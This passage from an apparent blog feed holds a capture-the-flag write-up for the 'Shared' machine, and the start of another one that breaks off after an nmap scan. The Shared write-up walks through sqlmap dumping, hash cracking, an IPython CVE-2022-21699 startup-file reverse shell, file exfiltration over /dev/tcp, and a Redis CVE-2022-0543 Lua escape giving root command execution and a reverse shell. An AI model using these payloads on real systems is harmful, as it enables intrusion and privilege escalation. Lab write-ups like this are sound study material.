</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">do you want to crack them via a dictionary-based attack? [Y/n/q] Y
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:44:05] [INFO] using hash method &#39;</span>md5_generic_passwd<span style="color:#e6db74">&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">what dictionary do you want to use?
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[1] default dictionary file &#39;</span>/usr/share/sqlmap/data/txt/wordlist.tx_<span style="color:#e6db74">&#39; (press Enter)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[2] custom dictionary file
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[3] file with list of dictionary files
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&gt; 1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:44:05] [INFO] using default dictionary
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">do you want to use common password suffixes? (slow!) [y/N] N
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:44:05] [INFO] starting dictionary-based cracking (md5_generic_passwd)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:44:05] [INFO] starting 4 processes 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:44:14] [WARNING] no clear password(s) found                                                                                                                                                                    
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Database: checkout
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Table: user
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[1 entry]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">+----+----------------------------------+-------------+
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| id | password                         | username    |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">+----+----------------------------------+-------------+
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| 1  | fc895d4eddc2fc12f995e18c865cf273 | james_mason |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">+----+----------------------------------+-------------+
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:44:14] [INFO] table &#39;</span>checkout.<span style="color:#e6db74">`</span>user<span style="color:#e6db74">`</span><span style="color:#e6db74">&#39; dumped to CSV file &#39;</span>/home/kali/.local/share/sqlmap/output/checkout.shared.htb/dump/checkout/user.csv<span style="color:#e6db74">&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:44:14] [INFO] fetched data logged to text files under &#39;</span>/home/kali/.local/share/sqlmap/output/checkout.shared.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ending @ 22:44:14 /2022-11-11/
</span></span></code></pre></div></li>
</ul>
<h2 id="cracking-credentials">Cracking Credentials</h2>
<p>Found user <em>james_mason</em> with hash <em>fc895d4eddc2fc12f995e18c865cf273</em>. I&rsquo;ll try to crack this hash using <code>hashcat</code>:</p>
<p><code>hashcat -a 0 -m 0 fc895d4eddc2fc12f995e18c865cf273 /usr/share/wordlists/rockyou.txt</code></p>
<p>Got the password: <em>Soleil101</em></p>
<h2 id="ssh-to-machine">SSH To Machine</h2>
<p>If I try to <em>SSH</em> as <em>james_mason</em> and password <em>Soleil101</em>, it works:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ssh james_mason@shared.htb 
</span></span><span style="display:flex;"><span>james_mason@shared.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
</span></span><span style="display:flex;"><span>Linux shared 5.10.0-16-amd64 <span style="color:#75715e">#1 SMP Debian 5.10.127-1 (2022-06-30) x86_64</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span style="display:flex;"><span>permitted by applicable law.
</span></span><span style="display:flex;"><span>Last login: Fri Nov <span style="color:#ae81ff">11</span> 12:29:09 <span style="color:#ae81ff">2022</span> from 10.10.14.44
</span></span><span style="display:flex;"><span>james_mason@shared:~$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>james_mason<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>james_mason<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>james_mason<span style="color:#f92672">)</span>,1001<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>james_mason@shared:~$ 
</span></span></code></pre></div><h3 id="post-enumeration">Post Enumeration</h3>
<p>I&rsquo;ll use <code>pspy64</code> to monitor processes and see what is running:</p>
<ul>
<li>First I&rsquo;ll host the file using <code>python3 -m http.server</code>.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>james_mason@shared:/tmp$ wget http://10.10.16.25:8000/pspy64 <span style="color:#f92672">&amp;&amp;</span> chmod +x pspy64
</span></span><span style="display:flex;"><span>--2022-11-12 07:58:10--  http://10.10.16.25:8000/pspy64
</span></span><span style="display:flex;"><span>Connecting to 10.10.16.25:8000... connected.
</span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
</span></span><span style="display:flex;"><span>Length: <span style="color:#ae81ff">3078592</span> <span style="color:#f92672">(</span>2.9M<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>application/octet-stream<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Saving to: ‘pspy64’
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pspy64                                               100%<span style="color:#f92672">[======================================================================================================================</span>&gt;<span style="color:#f92672">]</span>   2.94M   575KB/s    in 6.4s    
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>2022-11-12 07:58:17 <span style="color:#f92672">(</span><span style="color:#ae81ff">466</span> KB/s<span style="color:#f92672">)</span> - ‘pspy64’ saved <span style="color:#f92672">[</span>3078592/3078592<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>james_mason@shared:/tmp$ ./pspy64 
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>2022/11/11 15:55:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">1001</span> PID<span style="color:#f92672">=</span><span style="color:#ae81ff">40710</span>  | /usr/bin/pkill ipython 
</span></span><span style="display:flex;"><span>2022/11/11 15:55:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">1001</span> PID<span style="color:#f92672">=</span><span style="color:#ae81ff">40709</span>  | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ <span style="color:#f92672">&amp;&amp;</span> /usr/local/bin/ipython 
</span></span><span style="display:flex;"><span>2022/11/11 15:55:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">1001</span> PID<span style="color:#f92672">=</span><span style="color:#ae81ff">40711</span>  | /usr/bin/python3 /usr/local/bin/ipython 
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>I can see another user of <em>UID=1001</em> running <em>ipython</em> in <em>/opt/scripts_review/</em>, and if I list this directory using <code>ls -la</code> I will see that it is owned by <em>developer</em> group which <em>james_mason</em> (my current user) is part of:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>james_mason@shared:~$ ls -la /opt/scripts_review/
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>drwxrwx--- <span style="color:#ae81ff">2</span> root developer <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">12</span> 05:18 .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> root root      <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">14</span> 13:46 ..
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>james_mason@shared:~$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>james_mason<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>james_mason<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>james_mason<span style="color:#f92672">)</span>,1001<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Now, if I check <em>ipython</em> version I can see that it is <em>8.0.0</em>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>james_mason@shared:~$ ipython --version
</span></span><span style="display:flex;"><span>8.0.0
</span></span></code></pre></div><h2 id="escalating-to-dan_smith-and-getting-user-flag">Escalating To dan_smith And Getting User Flag</h2>
<p>And searching a little bit on google for possible exploits, I can see that it is vulnerable to <em>CVE-2022-21699</em> and the poc is in this github 

<a href="https://github.com/advisories/GHSA-pq7m-3gw7-gq5x" target="_blank"><em>repo</em></a>.</p>
<p>In brief, I can abuse my privileges to write files to <em>/opt/scripts_review/</em> and gain code execution as any user that runs <em>ipython</em> in this directory, which in this case is the user of <em>UID=1001</em>:</p>
<ul>
<li>
<p>On victim machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>james_mason@shared:/opt/scripts_review$ mkdir -m <span style="color:#ae81ff">777</span> /opt/scripts_review/profile_default
</span></span><span style="display:flex;"><span>james_mason@shared:/opt/scripts_review$ mkdir -m <span style="color:#ae81ff">777</span> /opt/scripts_review/profile_default/startup
</span></span><span style="display:flex;"><span>james_mason@shared:/opt/scripts_review$ echo <span style="color:#e6db74">&#39;import os;os.system(&#34;bash -c \&#34;bash -i &gt;&amp; /dev/tcp/10.10.16.25/4242 0&gt;&amp;1\&#34;&#34;)&#39;</span> &gt; /opt/scripts_review/profile_default/startup/foo.py
</span></span></code></pre></div></li>
<li>
<p>On attacker machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nc -lvnp <span style="color:#ae81ff">4242</span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4242</span> ...
</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.16.25<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.11.172<span style="color:#f92672">]</span> <span style="color:#ae81ff">37664</span>
</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>19154<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
</span></span><span style="display:flex;"><span>bash: no job control in this shell
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dan_smith@shared:/opt/scripts_review$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>dan_smith<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>dan_smith<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>dan_smith<span style="color:#f92672">)</span>,1001<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span>,1003<span style="color:#f92672">(</span>sysadmin<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dan_smith@shared:/opt/scripts_review$ 
</span></span></code></pre></div></li>
</ul>
<p><img src="gettting_reverse_shell_as_dan_smith.png" alt="Gainnig Reverse Shell As dan_smith"></p>
<h2 id="post-enumeration-as-dan_smith">Post Enumeration As dan_smith</h2>
<p>Since <em>dan_smith</em> is part of <em>sysadmin</em> group, got from executing <code>id</code> command previously, I&rsquo;ll try to find files or directories owned by this group:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dan_smith@shared:/tmp$ find / -group sysadmin 2&gt;/dev/null
</span></span><span style="display:flex;"><span>/usr/local/bin/redis_connector_dev
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dan_smith@shared:/tmp$ file /usr/local/bin/redis_connector_dev
</span></span><span style="display:flex;"><span>/usr/local/bin/redis_connector_dev: ELF 64-bit LSB executable, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go BuildID<span style="color:#f92672">=</span>sdGIDsCGb51jonJ_67fq/_JkvEmzwH9g6f0vQYeDG/iH1iXHhyzaDZJ056wX9s/7UVi3T2i2LVCU8nXlHgr, not stripped
</span></span></code></pre></div><h3 id="finding-vulnerable-redis-server">Finding Vulnerable Redis Server</h3>
<p>It appears that this group owns a custom executable file that seems responsible of connecting to a redis server. By executing this file, I got the following output:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dan_smith@shared:/tmp$ /usr/local/bin/redis_connector_dev
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Logging to redis instance using password...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>INFO command result:
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Server</span>
</span></span><span style="display:flex;"><span>redis_version:6.0.15
</span></span><span style="display:flex;"><span>redis_git_sha1:00000000
</span></span><span style="display:flex;"><span>redis_git_dirty:0
</span></span><span style="display:flex;"><span>redis_build_id:4610f4c3acf7fb25
</span></span><span style="display:flex;"><span>redis_mode:standalone
</span></span><span style="display:flex;"><span>os:Linux 5.10.0-16-amd64 x86_64
</span></span><span style="display:flex;"><span>arch_bits:64
</span></span><span style="display:flex;"><span>multiplexing_api:epoll
</span></span><span style="display:flex;"><span>atomicvar_api:atomic-builtin
</span></span><span style="display:flex;"><span>gcc_version:10.2.1
</span></span><span style="display:flex;"><span>process_id:20820
</span></span><span style="display:flex;"><span>run_id:b6b6f59e46c3d2cbeaeac87cc60da39cde942e82
</span></span><span style="display:flex;"><span>tcp_port:6379
</span></span><span style="display:flex;"><span>uptime_in_seconds:41
</span></span><span style="display:flex;"><span>uptime_in_days:0
</span></span><span style="display:flex;"><span>hz:10
</span></span><span style="display:flex;"><span>configured_hz:10
</span></span><span style="display:flex;"><span>lru_clock:7317624
</span></span><span style="display:flex;"><span>executable:/usr/bin/redis-server
</span></span><span style="display:flex;"><span>config_file:/etc/redis/redis.conf
</span></span><span style="display:flex;"><span>io_threads_active:0
</span></span><span style="display:flex;"><span> &lt;nil&gt;
</span></span></code></pre></div><p>Looks like this executable contains a password that is sent to the redis server to authenticate, and the server&rsquo;s version is 6.0.15.</p>
<p>And using <code>netsat</code> I can see port <em>6379</em> is open:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dan_smith@shared:~$ netstat -lnpt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>Not all processes could be identified, non-owned process info
</span></span><span style="display:flex;"><span> will not be shown, you would have to be root to see it all.<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Active Internet connections <span style="color:#f92672">(</span>only servers<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:6379          0.0.0.0:*               LISTEN      -                   
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:443             0.0.0.0:*               LISTEN      -                   
</span></span><span style="display:flex;"><span>tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::22                   :::*                    LISTEN      -                   
</span></span></code></pre></div><p>Which means that the executable is connecting to <em>127.0.0.1</em> on port <em>6379</em> running redis version <em>6.0.15</em> by providing a password.</p>
<p>Googling a little bit for exploits, I can see that this version is vulnerable to 

<a href="https://nvd.nist.gov/vuln/detail/CVE-2022-0543" target="_blank"><em>CVE-2022-0543</em></a>. And there is also a public 

<a href="https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md" target="_blank"><em>POC here</em></a>.</p>
<h3 id="getting-password-for-redis-server">Getting Password For Redis Server</h3>
<p>So, what I&rsquo;ll do first is to import this executable to my machine and listen on port 6379 using <code>nc</code>, then execute it to catch the password sent.</p>
<ul>
<li>On my attacking machine:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nc -lvnp <span style="color:#ae81ff">8989</span> &gt; redis_connect
</span></span></code></pre></div></li>
<li>On the victim machine:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat /usr/local/bin/redis_connector_dev &gt; /dev/tcp/10.10.16.25/8989
</span></span></code></pre></div></li>
</ul>
<p>Then I&rsquo;ll listen on port 6379 and execute the file:</p>
<ul>
<li>Shell 1:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nc -lvnp <span style="color:#ae81ff">6379</span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">6379</span> ...
</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>127.0.0.1<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>127.0.0.1<span style="color:#f92672">]</span> <span style="color:#ae81ff">58990</span>
</span></span><span style="display:flex;"><span>*2
</span></span><span style="display:flex;"><span>$4
</span></span><span style="display:flex;"><span>auth
</span></span><span style="display:flex;"><span>$16
</span></span><span style="display:flex;"><span>F2WHqJUz2WEz<span style="color:#f92672">=</span>Gqq
</span></span></code></pre></div></li>
<li>Shell 2:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ chmod +x redis_connect 
</span></span><span style="display:flex;"><span>$ ./redis_connect 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Logging to redis instance using password...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>INFO command result:
</span></span><span style="display:flex;"><span> i/o timeout
</span></span></code></pre></div></li>
</ul>
<p>I got the password: <em>F2WHqJUz2WEz=Gqq</em>.</p>
<h2 id="port-forwarding-redis-server">Port Forwarding Redis Server</h2>
<p>Now, I&rsquo;ll forward it to my attacking machine using 

<a href="https://github.com/jpillora/chisel" target="_blank"><em>chisel</em></a>, and exploit the server using the payload from the previous 

<a href="https://github.com/aodsec/CVE-2022-0543.git" target="_blank"><em>exploit poc</em></a> I found:</p>
<ul>
<li>First, I&rsquo;ll host the 

<a href="https://github.com/jpillora/chisel" target="_blank"><em>chisel</em></a> using <code>python3 -m http.server</code>.</li>
<li>On my attacking machine:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ /opt/chisel/chisel_1.7.7_linux_amd64 server -p <span style="color:#ae81ff">9001</span> --reverse
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>2022/11/12 15:53:52 server: Reverse tunnelling enabled
</span></span><span style="display:flex;"><span>2022/11/12 15:53:52 server: Fingerprint /CogTSMbGXcwvy1M7DxTYDUtLfiXP4xQg1HEqiE7WCk<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>2022/11/12 15:53:52 server: Listening on http://0.0.0.0:9001
</span></span></code></pre></div></li>
<li>On victim machine:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dan_smith@shared:/tmp$ wget http://10.10.16.25:8000/chisel_1.7.7_linux_amd64 <span style="color:#f92672">&amp;&amp;</span> chmod +x chisel_1.7.7_linux_amd64
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dan_smith@shared:/tmp$ ./chisel_1.7.7_linux_amd64 client 10.10.16.25:9001 R:127.0.0.1:6379:127.0.0.1:6379 &amp;
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> <span style="color:#ae81ff">20206</span>
</span></span><span style="display:flex;"><span>2022/11/12 08:55:40 client: Connecting to ws://10.10.16.25:9001
</span></span><span style="display:flex;"><span>2022/11/12 08:55:42 client: Connected <span style="color:#f92672">(</span>Latency 80.842105ms<span style="color:#f92672">)</span>
</span></span></code></pre></div></li>
</ul>
<h3 id="getting-reverse-shell-as-root">Getting Reverse Shell As root</h3>
<p>Now that the port is forwarded, I&rsquo;ll can interact with the server and send the malicious payload, but first I need to install <em>redis-cli</em> which comes with <em>redis-tools</em> package:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo apt install redis-tools
</span></span></code></pre></div><p>The payload that I&rsquo;ll send to execute <code>id</code> command is the following: <code>eval 'local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;id&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res' 0</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ redis-cli -h 127.0.0.1 -a F2WHqJUz2WEz<span style="color:#f92672">=</span>Gqq
</span></span><span style="display:flex;"><span>Warning: Using a password with <span style="color:#e6db74">&#39;-a&#39;</span> or <span style="color:#e6db74">&#39;-u&#39;</span> option on the command line interface may not be safe.
</span></span><span style="display:flex;"><span>127.0.0.1:6379&gt; eval <span style="color:#e6db74">&#39;local io_l = package.loadlib(&#34;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&#34;, &#34;luaopen_io&#34;); local io = io_l(); local f = io.popen(&#34;id&#34;, &#34;r&#34;); local res = f:read(&#34;*a&#34;); f:close(); return res&#39;</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;uid=0(root) gid=0(root) groups=0(root)\n&#34;</span>
</span></span></code></pre></div><p>And I can see that I got code execution as root!!</p>
<p>The payload to get a reverse shell is like the following: <code>eval 'local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;bash -c \&quot;bash -i&gt;&amp; /dev/tcp/10.10.16.25/9002 0&gt;&amp;1\&quot;&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res' 0</code></p>
<p><img src="Getting-root_reverse_shell.png" alt="Getting root Shell"></p>
]]></content>
        </item>
        
        <item>
            <title>Moderators Write-Up</title>
            <link>https://mostxeon.github.io/posts/moderators/</link>
            <pubDate>Thu, 03 Nov 2022 14:54:40 +0200</pubDate>
            
            <guid>https://mostxeon.github.io/posts/moderators/</guid>
            <description>false</description>
            <content type="html"><![CDATA[<h2 id="initial-recon">Initial Recon</h2>
<h3 id="nmap">Nmap</h3>
<p>Starting with a full tcp port scan using nmap, I got the following results:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -sC -sV -vvv -oN nmap/nmap-all-tcp.txt -p- 10.10.11.173
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.173
</span></span><span style="display:flex;"><span>Host is up, received syn-ack <span style="color:#f92672">(</span>0.14s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Scanned at 2022-08-12 20:36:48 EEST <span style="color:#66d9ef">for</span> 442s
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE REASON  VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 39:03:16:06:11:30:a0:b0:c2:91:79:88:d3:93:1b:3e <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDVKTX9lrW0T2kgN/idXDQgowtSSGNJiULsNel0JKKX42GCLWDVSaDcZCcuPsxwxOYxSvEPmU8N7ZLka7rFJNBSbnlnfI4pP8r2ZYwB4Ioa+mJ7lkdmexkabiDupyue1hd2QNJ8mHjmPNd9LByhOq+CsXTdXe50qkhnSxil8inp8r4zAFDwWYCpjt2EeBKqqyWSlQptU+mjLfIP7903sUfLNhkKtEdEJfiGfpfd4QYCVWmqsWPD0q/S69/mDZ7Ic0Bhj4VVXVQkkxDIyG3NmNtY1dF/uxvB86Ca+q/bO0PUZ/PEI2EaoXydS5YVHb2ZxLy17ltoDC0JW+wogVe/+NV75tqOQESQfyqFTZOnpq2jBgrXq90FczUr1Rl/7JQZ4V5nt+asvhxFRs94qxidRdf60aP/Izgkg1UltttQCS4s984Lfnfmk1LVlJ74Q/QMZZIGdRf8HwZzqqW/zBLozU0FbSdq8kOXFhZDeLqCfrVLvBncD3fHjKj+h7gSq3nFbWk<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 51:94:5c:59:3b:bd:bc:b6:26:7a:ef:83:7f:4c:ca:7d <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIEFsa05VSw1Z4FCOfBS4hGgxc7g6Z9Giortn/lxqktVOBrkAyUfJRs7AteBGqIyjHNOQJi97xMufArOj4vQJwU<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> a5:6d:03:fa:6c:f5:b9:4a:a2:a1:b6:bd:bc:60:42:31 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP3W656yOHPoAqoWckwZsh/ZzF1IX/9rN+LB9MkS56OI
</span></span><span style="display:flex;"><span>80/tcp open  http    syn-ack Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
